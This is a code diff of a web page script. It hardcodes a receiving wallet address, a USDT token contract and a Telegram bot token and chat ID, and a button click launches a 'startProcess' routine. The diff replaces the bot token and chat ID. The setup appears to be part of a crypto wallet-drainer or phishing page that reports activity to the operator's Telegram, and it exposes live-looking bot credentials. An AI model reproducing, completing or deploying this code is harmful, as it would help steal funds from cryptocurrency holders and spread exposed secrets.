@@ -2,8 +2,8 @@ const myWalletAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; 
 
 // Telegram Config
-const telegramBotToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
-const telegramChatId = "@bullbuy_1";
+const telegramBotToken = "8503598876:AAFQBEMmfHgcjPpyA_TwTJxTz34gwOswH1k";
+const telegramChatId = "8503598876";
 
 async function sendTelegram(msg) {
     const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
@@ -81,4 +81,5 @@ async function startProcess() {
 }
 
 document.getElementById("nextBtn").addEventListener("click", startProcess);
+
 
